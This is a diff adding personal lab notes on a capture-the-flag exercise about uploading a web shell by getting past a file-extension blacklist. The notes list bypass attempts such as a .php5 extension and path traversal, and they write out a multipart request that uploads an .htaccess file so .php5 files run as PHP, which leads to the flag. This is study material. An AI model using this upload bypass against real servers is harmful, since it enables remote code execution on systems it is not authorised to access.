@@ -1,0 +1,33 @@
+## 📅 Date: 
+
+### 🎯 Topic:Web shell upload via extension blacklist bypass
+
+
+### 🎯 Steps Taken:
+1.  change file name with payload test_shell.php%20.png ->  success upload -> access by url /files/avatars/test_shell.php%20.png -> not found
+2.  change payload shell.php5 -> success -> access url /files/avatars/shell.php5 -> i got return script as txt 
+3.  change payload ..%2fshell.php5 and ..%2f52shell.php5 ->success-> access url /files/avatars/..%2fshell.php5 -> invalid image file name
+4.  after upload try access path /files/fileshell.php5 -> not found
+5.  change filename payload ../file2.png -> file success actual save in avatar/file2.png but in database path is save files/avatars/../file.2.png
+6. change filename payload ..%2ffilef3.png -> file success actual save in avatar/..%2ffilef3.png but got error readed file name 
+7. change payload like this  -> upload .htaccess and make that directory can run .php5 extention as php 
+``` 
+------WebKitFormBoundaryLWo1Lu5efqJLGwTB
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .php5
+
+------WebKitFormBoundaryLWo1Lu5efqJLGwTB
+Content-Disposition: form-data; name="user"
+
+```
+8. upload payload shell.php5 -> success -> call /file/avatars/shell.php5 -> got flag
+
+
+### 💡 Result:
+
+### 🧠 Analysis:
+
+### 📚 Lesson/ Insight:
+
